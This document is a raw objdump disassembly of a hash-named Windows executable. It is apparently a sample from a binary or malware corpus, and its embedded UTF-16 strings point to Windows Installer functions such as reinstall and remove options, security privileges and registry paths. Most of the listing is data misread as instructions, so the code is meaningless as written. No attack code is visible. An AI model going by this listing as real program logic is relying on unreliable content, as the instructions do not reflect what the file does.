
aa9a979d94922890659da40a4ba266144d2075c8c3aeeb7b4e0dcb9c3f6f4248.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	add    BYTE PTR [esi+0x26600040],cl
  40100a:	inc    eax
  40100b:	add    BYTE PTR [eax+0x26],dh
  40100e:	inc    eax
  40100f:	add    BYTE PTR [eax-0x3fffbfda],dh
  401015:	es inc eax
	...
  40101f:	add    BYTE PTR [eax],dh
  401021:	lea    eax,[eax+0x0]
  401024:	adc    BYTE PTR [edi+0x40],dl
  40102a:	add    BYTE PTR [eax],al
  40102c:	pusha  
  40102d:	add    BYTE PTR es:[eax],al
  401030:	add    BYTE PTR [eax+0x26],dh
  401033:	add    BYTE PTR [eax],al
  401035:	add    BYTE PTR [eax+0x26],dh
  40103b:	shl    BYTE PTR [esi],0x0
  40103e:	add    BYTE PTR [eax],al
  401040:	and    BYTE PTR [ebx],dh
  401042:	add    BYTE PTR [eax],al
  401044:	add    BYTE PTR [eax+0x33],al
  40104a:	nop
  40104b:	xor    eax,DWORD PTR [eax]
  40104d:	add    BYTE PTR [eax],al
  40104f:	loopne 0x401085
  401051:	add    BYTE PTR [eax],al
  401053:	add    BYTE PTR [eax],dl
  401055:	add    BYTE PTR ss:[eax],al
  401058:	add    al,dh
  40105a:	cmp    al,0x0
  40105c:	add    BYTE PTR [eax],al
  40105e:	mov    al,0x3f
  401060:	add    BYTE PTR [eax],al
  401062:	add    al,dh
  401064:	aas    
  401065:	add    BYTE PTR [eax],al
  401067:	add    BYTE PTR [eax],ah
  401069:	inc    eax
  40106a:	add    BYTE PTR [eax],al
  40106c:	add    al,dh
  40106e:	inc    eax
  40106f:	add    BYTE PTR [eax],al
  401071:	add    BYTE PTR [eax],dh
  401073:	inc    ecx
  401074:	add    BYTE PTR [eax],al
  401076:	add    BYTE PTR [eax+0x42],dh
  40107c:	inc    eax
  40107d:	inc    esp
  40107e:	add    BYTE PTR [eax],al
  401080:	add    BYTE PTR [eax+0x44],ah
  401083:	add    BYTE PTR [eax],al
  401085:	add    BYTE PTR [eax+0x45],al
  401088:	add    BYTE PTR [eax],al
  40108a:	add    BYTE PTR [eax+0x48],al
  401090:	mov    al,0x49
  401092:	add    BYTE PTR [eax],al
  401094:	add    BYTE PTR [eax],al
  401096:	dec    edx
  401097:	add    BYTE PTR [eax],al
  401099:	add    BYTE PTR [eax+0x4c],dh
  40109f:	loopne 0x4010ed
  4010a1:	add    BYTE PTR [eax],al
  4010a3:	add    BYTE PTR [eax+0x4f],ah
  4010a6:	add    BYTE PTR [eax],al
  4010a8:	add    BYTE PTR [eax+0x4f],al
  4010ae:	mov    al,ds:0x4f
  4010b3:	loopne 0x401104
  4010b5:	add    BYTE PTR [eax],al
  4010b7:	add    BYTE PTR [eax],al
  4010b9:	ja     0x4010bb
  4010bb:	add    BYTE PTR [eax],al
  4010bd:	pusha  
  4010be:	ja     0x4010c0
  4010c0:	add    BYTE PTR [eax],al
  4010c2:	add    BYTE PTR [eax+0x0],bh
  4010c5:	add    BYTE PTR [eax],al
  4010c7:	jo     0x401147
  4010c9:	add    BYTE PTR [eax],al
  4010cb:	add    al,dh
  4010cd:	add    DWORD PTR [eax],0x82500000
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	add    BYTE PTR [eax+0x82],dh
  4010db:	and    BYTE PTR [ebx-0x80000000],al
  4010e1:	test   BYTE PTR [eax],al
  4010e3:	add    BYTE PTR [eax],al
  4010e5:	rol    BYTE PTR [eax+eax*1-0x7af00000],1
  4010ec:	add    BYTE PTR [eax],al
  4010ee:	add    BYTE PTR [eax],dl
  4010f0:	xchg   BYTE PTR [eax],al
  4010f2:	add    BYTE PTR [eax],al
  4010f4:	jo     0x40107c
  4010f6:	add    BYTE PTR [eax],al
  4010f8:	add    al,dl
  4010fa:	xchg   BYTE PTR [eax],al
  4010fc:	add    BYTE PTR [eax],al
  4010fe:	rol    BYTE PTR [edi+0x20000000],0x88
  401105:	add    BYTE PTR [eax],al
  401107:	add    BYTE PTR [eax+0x88],al
  40110d:	loopne 0x401097
  40110f:	add    BYTE PTR [eax],al
  401111:	add    BYTE PTR [eax],dh
  401113:	lea    eax,[eax]
  401115:	add    BYTE PTR [eax],al
  401117:	add    BYTE PTR [esi+0x40000000],cl
  40111d:	mov    es,WORD PTR [eax]
  40111f:	add    BYTE PTR [eax],al
  401121:	nop
  401122:	nop
  401123:	add    BYTE PTR [eax],al
  401125:	add    BYTE PTR [eax],al
  401127:	xchg   esp,eax
  401128:	add    BYTE PTR [eax],al
  40112a:	add    al,al
  40112c:	xchg   esi,eax
  40112d:	add    BYTE PTR [eax],al
  40112f:	add    BYTE PTR [eax],dl
  401131:	xchg   edi,eax
  401132:	add    BYTE PTR [eax],al
  401134:	add    al,dh
  401136:	cdq    
  401137:	add    BYTE PTR [eax],al
  401139:	add    BYTE PTR [eax+0x9a],al
  40113f:	nop
  401140:	fwait
  401141:	add    BYTE PTR [eax],al
  401143:	add    BYTE PTR [eax-0x64],dh
  401146:	add    BYTE PTR [eax],al
  401148:	add    BYTE PTR [eax+0x9c],ah
  40114e:	mov    al,0x9c
  401150:	add    BYTE PTR [eax],al
  401152:	add    al,al
  401154:	pushf  
  401155:	add    BYTE PTR [eax],al
  401157:	add    al,dl
  401159:	pushf  
  40115a:	add    BYTE PTR [eax],al
  40115c:	add    al,ah
  40115e:	pushf  
  40115f:	add    BYTE PTR [eax],al
  401161:	add    al,dh
  401163:	pushf  
  401164:	add    BYTE PTR [eax],al
  401166:	add    BYTE PTR [eax],al
  401168:	popf   
  401169:	add    BYTE PTR [eax],al
  40116b:	add    BYTE PTR [eax],dl
  40116d:	popf   
  40116e:	add    BYTE PTR [eax],al
  401170:	add    BYTE PTR [eax],ah
  401172:	popf   
  401173:	add    BYTE PTR [eax],al
  401175:	add    BYTE PTR [eax],dh
  401177:	popf   
  401178:	add    BYTE PTR [eax],al
  40117a:	add    BYTE PTR [eax-0x63],al
  40117d:	add    BYTE PTR [eax],al
  40117f:	add    BYTE PTR [eax-0x63],dl
  401182:	add    BYTE PTR [eax],al
  401184:	add    BYTE PTR [eax-0x63],ah
  401187:	add    BYTE PTR [eax],al
  401189:	add    BYTE PTR [eax-0x63],dh
  40118c:	add    BYTE PTR [eax],al
  40118e:	add    BYTE PTR [eax+0x9d],al
  401194:	nop
  401195:	popf   
  401196:	add    BYTE PTR [eax],al
  401198:	add    BYTE PTR [eax+0x9d],ah
  40119e:	rcr    BYTE PTR [ebp+0x0],0x9e
  4011a5:	add    BYTE PTR [eax],al
  4011a7:	add    BYTE PTR [eax],ah
  4011a9:	sahf   
  4011aa:	add    BYTE PTR [eax],al
  4011ac:	add    BYTE PTR [eax-0x62],al
  4011af:	add    BYTE PTR [eax],al
  4011b1:	add    BYTE PTR [eax+0x9e],al
	...
  4011bf:	add    al,dh
  4011c1:	rol    BYTE PTR [eax+0x0],0x40
  4011c5:	rol    DWORD PTR [eax+0x0],0x0
  4011c9:	add    BYTE PTR [eax],al
  4011cb:	add    BYTE PTR [eax],al
  4011cd:	add    BYTE PTR [eax],al
  4011cf:	add    BYTE PTR [ebp+0x73],ch
  4011d2:	imul   ebp,DWORD PTR [esi],0x6c6c64
  4011d8:	pop    esp
  4011d9:	add    BYTE PTR [eax],al
  4011db:	add    BYTE PTR [eax],al
  4011dd:	add    BYTE PTR [eax],al
  4011df:	add    BYTE PTR [ebx+0x0],dl
  4011e2:	add    BYTE PTR gs:[ebx+0x0],dl
  4011e6:	add    BYTE PTR gs:[ebx+0x0],ah
  4011ea:	jne    0x4011ec
  4011ec:	jb     0x4011ee
  4011ee:	imul   eax,DWORD PTR [eax],0x790074
  4011f4:	push   eax
  4011f5:	add    BYTE PTR [edx+0x0],dh
  4011f8:	imul   eax,DWORD PTR [eax],0x690076
  4011fe:	ins    BYTE PTR es:[edi],dx
  4011ff:	add    BYTE PTR [ebp+0x0],ah
  401202:	add    BYTE PTR [di+0x0],ah
  401206:	add    BYTE PTR [eax],al
  401208:	dec    ebp
  401209:	add    BYTE PTR [ebx+0x0],dl
  40120c:	dec    ecx
  40120d:	add    BYTE PTR [ebx+0x0],dl
  401210:	add    BYTE PTR gs:[edx+0x0],dh
  401214:	jbe    0x401216
  401216:	add    BYTE PTR gs:[edx+0x0],dh
  40121a:	add    BYTE PTR [eax],al
  40121c:	pop    edi
  40121d:	add    BYTE PTR [ebp+0x0],cl
  401220:	push   ebx
  401221:	add    BYTE PTR [ecx+0x0],cl
  401224:	pop    edi
  401225:	add    BYTE PTR [eax+eax*1+0x45],dl
  401229:	add    BYTE PTR [ebx+0x0],dl
  40122c:	push   esp
  40122d:	add    BYTE PTR [eax],al
  40122f:	add    BYTE PTR [ebx+0x0],dl
  401232:	add    BYTE PTR gs:[eax+eax*1+0x53],dh
  401237:	add    BYTE PTR [ebp+0x0],ah
  40123a:	jb     0x40123c
  40123c:	jbe    0x40123e
  40123e:	imul   eax,DWORD PTR [eax],0x650063
  401244:	push   ebx
  401245:	add    BYTE PTR [eax+eax*1+0x61],dh
  401249:	add    BYTE PTR [eax+eax*1+0x75],dh
  40124d:	add    BYTE PTR [ebx+0x0],dh
  401250:	and    BYTE PTR [eax],al
  401252:	data16 add BYTE PTR [ecx+0x0],ah
  401256:	imul   eax,DWORD PTR [eax],0x65006c
  40125c:	add    BYTE PTR fs:[esi],ch
	...
  401267:	add    BYTE PTR [edx+0x0],dl
  40126a:	add    BYTE PTR gs:[edi+0x0],ah
  40126e:	imul   eax,DWORD PTR [eax],0x740073
  401274:	add    BYTE PTR gs:[edx+0x0],dh
  401278:	push   ebx
  401279:	add    BYTE PTR [ebp+0x0],ah
  40127c:	jb     0x40127e
  40127e:	jbe    0x401280
  401280:	imul   eax,DWORD PTR [eax],0x650063
  401286:	inc    ebx
  401287:	add    BYTE PTR [eax+eax*1+0x72],dh
  40128b:	add    BYTE PTR [eax+eax*1+0x48],ch
  40128f:	add    BYTE PTR [ecx+0x0],ah
  401292:	outs   dx,BYTE PTR ds:[esi]
  401293:	add    BYTE PTR [eax+eax*1+0x6c],ah
  401297:	add    BYTE PTR [ebp+0x0],ah
  40129a:	jb     0x40129c
  40129c:	and    BYTE PTR [eax],al
  40129e:	data16 add BYTE PTR [ecx+0x0],ah
  4012a2:	imul   eax,DWORD PTR [eax],0x65006c
  4012a8:	add    BYTE PTR fs:[esi],ch
  4012ab:	add    BYTE PTR [eax],al
  4012ad:	add    BYTE PTR [eax],al
  4012af:	add    BYTE PTR [ebp+0x0],cl
  4012b2:	jae    0x4012b4
  4012b4:	imul   eax,DWORD PTR [eax],0x64002e
  4012ba:	ins    BYTE PTR es:[edi],dx
  4012bb:	add    BYTE PTR [eax+eax*1+0x0],ch
  4012bf:	add    BYTE PTR [esp+ebp*2+0x6c],al
  4012c3:	inc    edi
  4012c4:	gs je  0x40130a
  4012c7:	ins    BYTE PTR es:[edi],dx
  4012c8:	popa   
  4012c9:	jae    0x40133e
  4012cb:	dec    edi
  4012cc:	bound  ebp,QWORD PTR [edx+0x65]
  4012cf:	arpl   WORD PTR [eax+eax*1+0x0],si
  4012d3:	add    BYTE PTR [eax],ah
  4012d5:	add    BYTE PTR [eax],al
  4012d7:	add    BYTE PTR ds:0x2e006400,ah
  4012dd:	add    BYTE PTR ds:0x2e006400,ah
  4012e3:	add    BYTE PTR ds:0x34002e00,ah
  4012e9:	add    BYTE PTR [eax+eax*1+0x2e],ah
  4012ed:	add    BYTE PTR ds:0x6400,ah
  4012f3:	add    BYTE PTR [eax],al
  4012f5:	add    BYTE PTR [eax],al
  4012f7:	add    BYTE PTR [ebx],ch
  4012f9:	add    BYTE PTR [eax],al
  4012fb:	add    BYTE PTR [ecx],ah
  4012fd:	add    BYTE PTR [eax],al
  4012ff:	add    BYTE PTR [ebx],ch
  401301:	add    BYTE PTR [ecx],ah
  401303:	add    BYTE PTR [eax],al
  401305:	add    BYTE PTR [eax],al
  401307:	add    BYTE PTR [ecx],ah
  401309:	add    BYTE PTR [ebx],ch
  40130b:	add    BYTE PTR [eax],al
  40130d:	add    BYTE PTR [eax],al
  40130f:	add    BYTE PTR [eax+eax*1+0x6f],cl
  401313:	add    BYTE PTR [ebx+0x0],ah
  401316:	popa   
  401317:	add    BYTE PTR [eax+eax*1+0x50],ch
  40131b:	add    BYTE PTR [ecx+0x0],ah
  40131e:	arpl   WORD PTR [eax],ax
  401320:	imul   eax,DWORD PTR [eax],0x61
  401323:	add    BYTE PTR [edi+0x0],ah
  401326:	add    BYTE PTR gs:[eax],al
  401329:	add    BYTE PTR [eax],al
  40132b:	add    BYTE PTR [eax],ah
  40132d:	add    BYTE PTR [ebp+0x0],cl
  401330:	push   ebx
  401331:	add    BYTE PTR [ecx+0x0],cl
  401334:	dec    ecx
  401335:	add    BYTE PTR [esi+0x0],cl
  401338:	push   ebx
  401339:	add    BYTE PTR [eax+eax*1+0x41],dl
  40133d:	add    BYTE PTR [esi+0x0],cl
  401340:	inc    ebx
  401341:	add    BYTE PTR [ebp+0x0],al
  401344:	inc    edi
  401345:	add    BYTE PTR [ebp+0x0],dl
  401348:	dec    ecx
  401349:	add    BYTE PTR [eax+eax*1+0x3d],al
  40134d:	add    BYTE PTR [eax],al
  40134f:	add    BYTE PTR [edx+0x0],dl
  401352:	inc    ebp
  401353:	add    BYTE PTR [ebp+0x0],cl
  401356:	dec    edi
  401357:	add    BYTE PTR [esi+0x0],dl
  40135a:	inc    ebp
  40135b:	add    BYTE PTR ds:0x4c004100,bh
  401361:	add    BYTE PTR [eax+eax*1+0x0],cl
  401365:	add    BYTE PTR [eax],al
  401367:	add    BYTE PTR [ecx+0x0],al
  40136a:	inc    ebx
  40136b:	add    BYTE PTR [eax+eax*1+0x49],dl
  40136f:	add    BYTE PTR [edi+0x0],cl
  401372:	dec    esi
  401373:	add    BYTE PTR ds:0x44004100,bh
  401379:	add    BYTE PTR [ebp+0x0],cl
  40137c:	dec    ecx
  40137d:	add    BYTE PTR [esi+0x0],cl
  401380:	add    BYTE PTR [eax],al
  401382:	add    BYTE PTR [eax],al
  401384:	push   eax
  401385:	add    BYTE PTR [ebp+0x0],al
  401388:	inc    ebx
  401389:	add    BYTE PTR [ebp+0x0],cl
  40138c:	push   ebx
  40138d:	add    BYTE PTR [eax],al
  40138f:	add    BYTE PTR [edx+0x0],dl
  401392:	inc    ebp
  401393:	add    BYTE PTR [ecx+0x0],cl
  401396:	dec    esi
  401397:	add    BYTE PTR [ebx+0x0],dl
  40139a:	push   esp
  40139b:	add    BYTE PTR [ecx+0x0],al
  40139e:	dec    esp
  40139f:	add    BYTE PTR [eax+eax*1+0x3d],cl
  4013a3:	add    BYTE PTR [ecx+0x0],al
  4013a6:	dec    esp
  4013a7:	add    BYTE PTR [eax+eax*1+0x20],cl
  4013ab:	add    BYTE PTR [edx+0x0],dl
  4013ae:	inc    ebp
  4013af:	add    BYTE PTR [ecx+0x0],cl
  4013b2:	dec    esi
  4013b3:	add    BYTE PTR [ebx+0x0],dl
  4013b6:	push   esp
  4013b7:	add    BYTE PTR [ecx+0x0],al
  4013ba:	dec    esp
  4013bb:	add    BYTE PTR [eax+eax*1+0x4d],cl
  4013bf:	add    BYTE PTR [edi+0x0],cl
  4013c2:	inc    esp
  4013c3:	add    BYTE PTR [ebp+0x0],al
  4013c6:	cmp    eax,0x73002500
  4013cb:	add    BYTE PTR [eax],al
  4013cd:	add    BYTE PTR [eax],al
  4013cf:	add    BYTE PTR [eax+0x0],dl
  4013d2:	popa   
  4013d3:	add    BYTE PTR [ebx+0x0],ah
  4013d6:	imul   eax,DWORD PTR [eax],0x61
  4013d9:	add    BYTE PTR [edi+0x0],ah
  4013dc:	add    BYTE PTR gs:[ebx+0x0],al
  4013e0:	outs   dx,DWORD PTR ds:[esi]
  4013e1:	add    BYTE PTR [eax+eax*1+0x65],ah
  4013e5:	add    BYTE PTR [eax],al
  4013e7:	add    BYTE PTR [ecx+0x0],cl
  4013ea:	push   ebx
  4013eb:	add    BYTE PTR [ebp+0x0],cl
  4013ee:	dec    ecx
  4013ef:	add    BYTE PTR [esi+0x0],al
  4013f2:	xor    eax,DWORD PTR [eax]
  4013f4:	xor    al,BYTE PTR [eax]
  4013f6:	add    BYTE PTR cs:[eax+eax*1+0x4c],al
  4013fb:	add    BYTE PTR [eax+eax*1+0x0],cl
  4013ff:	add    BYTE PTR [ecx+0x6e],cl
  401402:	jae    0x401478
  401404:	popa   
  401405:	ins    BYTE PTR es:[edi],dx
  401406:	ins    BYTE PTR es:[edi],dx
  401407:	push   ebx
  401408:	je     0x40146b
  40140a:	je     0x401481
  40140c:	jae    0x40145b
  40140e:	dec    ecx
  40140f:	inc    esi
  401410:	add    BYTE PTR [eax],al
  401412:	add    BYTE PTR [eax],al
  401414:	dec    ecx
  401415:	outs   dx,BYTE PTR ds:[esi]
  401416:	jae    0x40148c
  401418:	popa   
  401419:	ins    BYTE PTR es:[edi],dx
  40141a:	ins    BYTE PTR es:[edi],dx
  40141b:	gs jb  0x40143e
  40141e:	gs jb  0x401493
  401421:	outs   dx,DWORD PTR ds:[esi]
  401422:	jb     0x401444
  401424:	and    eax,0x53000069
  401429:	add    BYTE PTR [edi+0x0],ch
  40142c:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  401431:	add    BYTE PTR [ecx+0x0],ah
  401434:	jb     0x401436
  401436:	add    BYTE PTR gs:[eax+eax*1+0x50],bl
  40143b:	add    BYTE PTR [edi+0x0],ch
  40143e:	ins    BYTE PTR es:[edi],dx
  40143f:	add    BYTE PTR [ecx+0x0],ch
  401442:	arpl   WORD PTR [eax],ax
  401444:	imul   eax,DWORD PTR [eax],0x730065
  40144a:	pop    esp
  40144b:	add    BYTE PTR [ebp+0x0],cl
  40144e:	imul   eax,DWORD PTR [eax],0x720063
  401454:	outs   dx,DWORD PTR ds:[esi]
  401455:	add    BYTE PTR [ebx+0x0],dh
  401458:	outs   dx,DWORD PTR ds:[esi]
  401459:	add    BYTE PTR [esi+0x0],ah
  40145c:	je     0x40145e
  40145e:	pop    esp
  40145f:	add    BYTE PTR [edi+0x0],dl
  401462:	imul   eax,DWORD PTR [eax],0x64006e
  401468:	outs   dx,DWORD PTR ds:[esi]
  401469:	add    BYTE PTR [edi+0x0],dh
  40146c:	jae    0x40146e
  40146e:	pop    esp
  40146f:	add    BYTE PTR [ecx+0x0],cl
  401472:	outs   dx,BYTE PTR ds:[esi]
  401473:	add    BYTE PTR [ebx+0x0],dh
  401476:	je     0x401478
  401478:	popa   
  401479:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40147d:	add    BYTE PTR [ebp+0x0],ah
  401480:	jb     0x401482
  401482:	add    BYTE PTR [eax],al
  401484:	inc    esp
  401485:	add    BYTE PTR [ebp+0x0],ah
  401488:	bound  eax,QWORD PTR [eax]
  40148a:	jne    0x40148c
  40148c:	add    BYTE PTR [bx+si],al
  40148f:	add    BYTE PTR [ebp+0x0],al
  401492:	jb     0x401494
  401494:	jb     0x401496
  401496:	outs   dx,DWORD PTR ds:[esi]
  401497:	add    BYTE PTR [edx+0x0],dh
  40149a:	cmp    al,BYTE PTR [eax]
  40149c:	and    BYTE PTR [eax],al
  40149e:	and    eax,0x2e006400
  4014a3:	add    BYTE PTR [eax],ah
  4014a5:	add    BYTE PTR ds:0x2e007300,ah
  4014ab:	add    BYTE PTR ds:0xa00,cl
  4014b1:	add    BYTE PTR [eax],al
  4014b3:	add    BYTE PTR ds:0xd007300,ah
  4014b9:	add    BYTE PTR [edx],cl
  4014bb:	add    BYTE PTR [eax],al
  4014bd:	add    BYTE PTR [eax],al
  4014bf:	add    BYTE PTR [ecx+0x75],dl
  4014c2:	gs jb  0x40153e
  4014c5:	dec    ecx
  4014c6:	outs   dx,BYTE PTR ds:[esi]
  4014c7:	jae    0x40153d
  4014c9:	popa   
  4014ca:	outs   dx,BYTE PTR ds:[esi]
  4014cb:	arpl   WORD PTR [ebp+0x43],sp
  4014ce:	outs   dx,DWORD PTR ds:[esi]
  4014cf:	jne    0x40153f
  4014d1:	je     0x4014d3
	...
  4014df:	add    BYTE PTR [ebx+0x0],cl
  4014e2:	inc    ebp
  4014e3:	add    BYTE PTR [edx+0x0],dl
  4014e6:	dec    esi
  4014e7:	add    BYTE PTR [ebp+0x0],al
  4014ea:	dec    esp
  4014eb:	add    BYTE PTR [ebx],dh
  4014ed:	add    BYTE PTR [edx],dh
  4014ef:	add    BYTE PTR [eax],al
  4014f1:	add    BYTE PTR [eax],al
  4014f3:	add    BYTE PTR [edi+0x65],al
  4014f6:	je     0x40154d
  4014f8:	jae    0x40155f
  4014fa:	jb     0x401540
  4014fc:	gs popaw 
  4014ff:	jne    0x40156d
  401501:	je     0x401558
  401503:	dec    ecx
  401504:	dec    esp
  401505:	popa   
  401506:	outs   dx,BYTE PTR ds:[esi]
  401507:	addr16 jne 0x40156b
  40150a:	add    BYTE PTR gs:[bx+si],al
  40150e:	add    BYTE PTR [eax],al
  401510:	dec    ecx
  401511:	add    BYTE PTR [esi+0x0],ch
  401514:	jae    0x401516
  401516:	je     0x401518
  401518:	popa   
  401519:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40151d:	add    BYTE PTR [eax],ah
  40151f:	add    BYTE PTR [ebp+0x0],ah
  401522:	jb     0x401524
  401524:	jb     0x401526
  401526:	outs   dx,DWORD PTR ds:[esi]
  401527:	add    BYTE PTR [edx+0x0],dh
  40152a:	and    BYTE PTR [eax],al
  40152c:	and    eax,0x6900
  401531:	add    BYTE PTR [eax],al
  401533:	add    BYTE PTR [eax+0x0],dl
  401536:	jb     0x401538
  401538:	outs   dx,DWORD PTR ds:[esi]
  401539:	add    BYTE PTR [eax+0x0],dh
  40153c:	add    BYTE PTR gs:[edx+0x0],dh
  401540:	je     0x401542
  401542:	jns    0x401544
  401544:	and    BYTE PTR [eax],al
  401546:	jbe    0x401548
  401548:	popa   
  401549:	add    BYTE PTR [eax+eax*1+0x75],ch
  40154d:	add    BYTE PTR [ebp+0x0],ah
  401550:	and    BYTE PTR [eax],al
  401552:	imul   eax,DWORD PTR [eax],0x200073
  401558:	je     0x40155a
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    BYTE PTR [edi+0x0],ch
  40155e:	and    BYTE PTR [eax],al
  401560:	ins    BYTE PTR es:[edi],dx
  401561:	add    BYTE PTR [edi+0x0],ch
  401564:	outs   dx,BYTE PTR ds:[esi]
  401565:	add    BYTE PTR [edi+0x0],ah
  401568:	add    BYTE PTR cs:0xa00,cl
  40156f:	add    BYTE PTR [esi+0x0],al
  401572:	popa   
  401573:	add    BYTE PTR [ecx+0x0],ch
  401576:	ins    BYTE PTR es:[edi],dx
  401577:	add    BYTE PTR [ebp+0x0],ah
  40157a:	add    BYTE PTR fs:[eax],ah
  40157d:	add    BYTE PTR [eax+eax*1+0x6f],dh
  401581:	add    BYTE PTR [eax],ah
  401583:	add    BYTE PTR [ebx+0x0],ah
  401586:	outs   dx,DWORD PTR ds:[esi]
  401587:	add    BYTE PTR [esi+0x0],ch
  40158a:	outs   dx,BYTE PTR ds:[esi]
  40158b:	add    BYTE PTR [ebp+0x0],ah
  40158e:	arpl   WORD PTR [eax],ax
  401590:	je     0x401592
  401592:	and    BYTE PTR [eax],al
  401594:	je     0x401596
  401596:	outs   dx,DWORD PTR ds:[esi]
  401597:	add    BYTE PTR [eax],ah
  401599:	add    BYTE PTR [ebx+0x0],dh
  40159c:	add    BYTE PTR gs:[edx+0x0],dh
  4015a0:	jbe    0x4015a2
  4015a2:	add    BYTE PTR gs:[edx+0x0],dh
  4015a6:	add    BYTE PTR cs:[eax],ah
  4015a9:	add    BYTE PTR [ebp+0x0],al
  4015ac:	jb     0x4015ae
  4015ae:	jb     0x4015b0
  4015b0:	outs   dx,DWORD PTR ds:[esi]
  4015b1:	add    BYTE PTR [edx+0x0],dh
  4015b4:	cmp    al,BYTE PTR [eax]
  4015b6:	and    BYTE PTR [eax],al
  4015b8:	xor    BYTE PTR [eax],al
  4015ba:	js     0x4015bc
  4015bc:	and    eax,0x5800
  4015c1:	add    BYTE PTR [eax],al
  4015c3:	add    BYTE PTR [ebx+0x0],cl
  4015c6:	add    BYTE PTR gs:[edx+0x0],dh
  4015ca:	outs   dx,BYTE PTR ds:[esi]
  4015cb:	add    BYTE PTR [ebp+0x0],ah
  4015ce:	ins    BYTE PTR es:[edi],dx
  4015cf:	add    BYTE PTR [ebx],dh
  4015d1:	add    BYTE PTR [edx],dh
  4015d3:	add    BYTE PTR [esi],ch
  4015d5:	add    BYTE PTR [eax+eax*1+0x6c],ah
  4015d9:	add    BYTE PTR [eax+eax*1+0x0],ch
  4015dd:	add    BYTE PTR [eax],al
  4015df:	add    BYTE PTR [eax+0x65],cl
  4015e2:	popa   
  4015e3:	jo     0x401638
  4015e5:	gs je  0x401631
  4015e8:	outs   dx,BYTE PTR ds:[esi]
  4015e9:	outs   dx,WORD PTR ds:[esi]
  4015eb:	jb     0x40165a
  4015ed:	popa   
  4015ee:	je     0x401659
  4015f0:	outs   dx,DWORD PTR ds:[esi]
  4015f1:	outs   dx,BYTE PTR ds:[esi]
  4015f2:	add    BYTE PTR [eax],al
  4015f4:	add    BYTE PTR [eax],al
  4015f6:	add    BYTE PTR [eax],al
  4015f8:	push   ebx
  4015f9:	add    BYTE PTR [edi+0x0],ch
  4015fc:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  401601:	add    BYTE PTR [ecx+0x0],ah
  401604:	jb     0x401606
  401606:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  40160b:	add    BYTE PTR [ecx+0x0],ch
  40160e:	arpl   WORD PTR [eax],ax
  401610:	jb     0x401612
  401612:	outs   dx,DWORD PTR ds:[esi]
  401613:	add    BYTE PTR [ebx+0x0],dh
  401616:	outs   dx,DWORD PTR ds:[esi]
  401617:	add    BYTE PTR [esi+0x0],ah
  40161a:	je     0x40161c
  40161c:	pop    esp
  40161d:	add    BYTE PTR [edi+0x0],dl
  401620:	imul   eax,DWORD PTR [eax],0x64006e
  401626:	outs   dx,DWORD PTR ds:[esi]
  401627:	add    BYTE PTR [edi+0x0],dh
  40162a:	jae    0x40162c
  40162c:	pop    esp
  40162d:	add    BYTE PTR [ebx+0x0],al
  401630:	jne    0x401632
  401632:	jb     0x401634
  401634:	jb     0x401636
  401636:	add    BYTE PTR gs:[esi+0x0],ch
  40163a:	je     0x40163c
  40163c:	push   esi
  40163d:	add    BYTE PTR [ebp+0x0],ah
  401640:	jb     0x401642
  401642:	jae    0x401644
  401644:	imul   eax,DWORD PTR [eax],0x6e006f
  40164a:	pop    esp
  40164b:	add    BYTE PTR [ecx+0x0],cl
  40164e:	outs   dx,BYTE PTR ds:[esi]
  40164f:	add    BYTE PTR [ebx+0x0],dh
  401652:	je     0x401654
  401654:	popa   
  401655:	add    BYTE PTR [eax+eax*1+0x6c],ch
  401659:	add    BYTE PTR [ebp+0x0],ah
  40165c:	jb     0x40165e
  40165e:	pop    esp
  40165f:	add    BYTE PTR [edx+0x0],dl
  401662:	jne    0x401664
  401664:	outs   dx,BYTE PTR ds:[esi]
  401665:	add    BYTE PTR [edi+0x0],cl
  401668:	outs   dx,BYTE PTR ds:[esi]
  401669:	add    BYTE PTR [ebx+0x0],ah
  40166c:	add    BYTE PTR gs:[ebp+0x0],al
  401670:	outs   dx,BYTE PTR ds:[esi]
  401671:	add    BYTE PTR [eax+eax*1+0x72],dh
  401675:	add    BYTE PTR [ecx+0x0],ch
  401678:	add    BYTE PTR gs:[ebx+0x0],dh
  40167c:	add    BYTE PTR [eax],al
  40167e:	add    BYTE PTR [eax],al
  401680:	jne    0x401682
  401682:	jo     0x401684
  401684:	add    BYTE PTR fs:[ecx+0x0],ah
  401688:	je     0x40168a
  40168a:	add    BYTE PTR gs:[eax],al
  40168d:	add    BYTE PTR [eax],al
  40168f:	add    BYTE PTR [ebp+0x0],dh
  401692:	outs   dx,BYTE PTR ds:[esi]
  401693:	add    BYTE PTR [ecx+0x0],ch
  401696:	outs   dx,BYTE PTR ds:[esi]
  401697:	add    BYTE PTR [ebx+0x0],dh
  40169a:	je     0x40169c
  40169c:	popa   
  40169d:	add    BYTE PTR [eax+eax*1+0x6c],ch
  4016a1:	add    BYTE PTR [eax],al
  4016a3:	add    BYTE PTR [eax+0x0],dh
  4016a6:	popa   
  4016a7:	add    BYTE PTR [ebx+0x0],ah
  4016aa:	imul   eax,DWORD PTR [eax],0x61
  4016ad:	add    BYTE PTR [edi+0x0],ah
  4016b0:	add    BYTE PTR gs:[eax],al
  4016b3:	add    BYTE PTR [edi],ch
  4016b5:	add    BYTE PTR [ecx+0x0],ch
  4016b8:	add    BYTE PTR [eax],al
  4016ba:	add    BYTE PTR [eax],al
  4016bc:	push   0x6c006500
  4016c1:	add    BYTE PTR [eax+0x0],dh
  4016c4:	add    BYTE PTR [eax],al
  4016c6:	add    BYTE PTR [eax],al
  4016c8:	das    
  4016c9:	add    BYTE PTR [eax+0x0],ch
  4016cc:	add    BYTE PTR [eax],al
  4016ce:	add    BYTE PTR [eax],al
  4016d0:	jno    0x4016d2
  4016d2:	jne    0x4016d4
  4016d4:	imul   eax,DWORD PTR [eax],0x740065
  4016da:	add    BYTE PTR [eax],al
  4016dc:	das    
  4016dd:	add    BYTE PTR [ecx+0x0],dh
  4016e0:	outs   dx,BYTE PTR ds:[esi]
  4016e1:	add    BYTE PTR [eax],al
  4016e3:	add    BYTE PTR [eax+0x0],dh
  4016e6:	popa   
  4016e7:	add    BYTE PTR [ebx+0x0],dh
  4016ea:	jae    0x4016ec
